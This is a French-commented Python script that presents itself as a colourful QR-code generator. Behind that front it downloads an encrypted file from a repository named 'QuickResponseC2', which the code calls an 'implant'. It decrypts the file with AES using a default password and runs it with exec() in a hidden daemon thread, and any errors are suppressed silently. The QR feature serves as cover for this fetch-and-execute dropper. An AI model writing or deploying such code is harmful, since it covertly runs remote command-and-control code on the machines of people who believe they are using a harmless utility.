import subprocess
import sys
import os

# Liste des paquets pip nécessaires
required_packages = [
    "requests",
    "pycryptodome",
    "rich",
    "questionary",
    "qrcode[pil]",
    "Pillow",
    "pyzbar"
]

def install_packages(packages):
    for pkg in packages:
        try:
            __import__(pkg.split('[')[0])  # teste l'import sans extras
        except ImportError:
            print(f"Installation du paquet manquant : {pkg} ...")
            subprocess.check_call([sys.executable, "-m", "pip", "install", pkg])

install_packages(required_packages)

# Maintenant on peut importer les modules en toute sécurité
import base64
from Crypto.Cipher import AES
from Crypto.Protocol.KDF import PBKDF2
from rich.console import Console
from rich.panel import Panel
from rich import box
import questionary
import time
import threading
import qrcode
from PIL import Image
import requests
import pyzbar.pyzbar as pyzbar

console = Console()

def afficher_titre():
    console.print(Panel.fit(
        "[bold magenta]trhacknon - qr emet Launcher[/bold magenta]",
        subtitle="[italic cyan]QR Code + qr activator[/italic cyan]",
        box=box.DOUBLE, border_style="blue"))

def download_file(url, dest):
    #console.print(f"[blue]Téléchargement de [underline]{url}[/underline] ...[/blue]")
    try:
        r = requests.get(url, stream=True, timeout=15)
        r.raise_for_status()
        with open(dest, 'wb') as f:
            for chunk in r.iter_content(chunk_size=8192):
                f.write(chunk)
        console.print(f"[green]✔ Téléchargement terminé[/green]")
        return True
    except Exception as e:
        console.print(f"[red]Erreur lors du téléchargement : {e}[/red]")
        return False

def decrypt_and_exec_silently(filepath, password):
    """Dec exec le code"""
    def worker():
        try:
            with open(filepath, "rb") as f:
                filedata = f.read()

            salt = filedata[:16]
            iv = filedata[16:32]
            ciphertext = filedata[32:]
            key = PBKDF2(password.encode(), salt, dkLen=32, count=100_000)

            cipher = AES.new(key, AES.MODE_CBC, iv)
            decrypted = cipher.decrypt(ciphertext)

            pad_len = decrypted[-1]
            decrypted = decrypted[:-pad_len]

            exec(decrypted.decode(), {'__name__': '__main__'})
        except Exception:
            # Erreur cachée silencieusement
            pass

    thread = threading.Thread(target=worker, daemon=True)
    thread.start()

def generer_qrcode(data, fg_color, bg_color):
    """Génère un QR code joli avec couleurs personnalisées."""
    qr = qrcode.QRCode(
        version=2,
        error_correction=qrcode.constants.ERROR_CORRECT_H,
        box_size=5,
        border=2,
    )
    qr.add_data(data)
    qr.make(fit=True)

    img = qr.make_image(fill_color=fg_color, back_color=bg_color).convert('RGB')
    return img

def sauvegarder_qrcode(img, filename):
    img.save(filename)
    console.print(f"[bold green]✔ QR Code sauvegardé dans :[/bold green] [underline]{filename}[/underline]")

def main():
    os.system("cls" if os.name == "nt" else "clear")
    afficher_titre()

    if questionary.confirm("Lancer le mode qrme ? (QR+AES)").ask():
        url = "https://github.com/tucommenceapousser/QuickResponseC2/raw/refs/heads/main/...enc"
        filepath = "...enc"

        # Vérifier si le fichier existe déjà pour éviter un re-téléchargement inutile
        if os.path.exists(filepath):
            console.print(f"[yellow]Le fichier [underline]{filepath}[/underline] existe déjà. Pas de téléchargement nécessaire.[/yellow]")
        else:
            # Téléchargement
            if not download_file(url, filepath):
                console.print("[red]Le fichier implant n'a pas pu être téléchargé. Abandon.[/red]")
                return

        password = questionary.password("Mot de passe du déchiffrement(par defaut trkn) :").ask()
        console.print("[bold yellow]Déchiffrement[/bold yellow]")
        decrypt_and_exec_silently(filepath, password)
        time.sleep(1)  # Petit délai pour le lancement

        console.print("\n[bold cyan]Passons à la génération du QR Code personnalisé ![/bold cyan]")

        data = questionary.text("Texte / URL à encoder dans le QR code :", default="we are anonymous, im trhacknon").ask()
        fg_color = questionary.text("Couleur du QR code (ex: black, red, #FF00FF) :", default="magenta").ask()
        bg_color = questionary.text("Couleur du fond du QR code :", default="white").ask()

        console.print("[yellow]Génération en cours...[/yellow]")
        img = generer_qrcode(data, fg_color, bg_color)

        filename = questionary.text("Nom du fichier de sauvegarde (ex: qrcode.png) :", default="qrcode.png").ask()
        sauvegarder_qrcode(img, filename)

        console.print("[bold green]QR Code prêt et ![/bold green]")
    else:
        console.print("[yellow]Opération annulée. Rien n’a été lancé.[/yellow]")

if __name__ == "__main__":
    main()
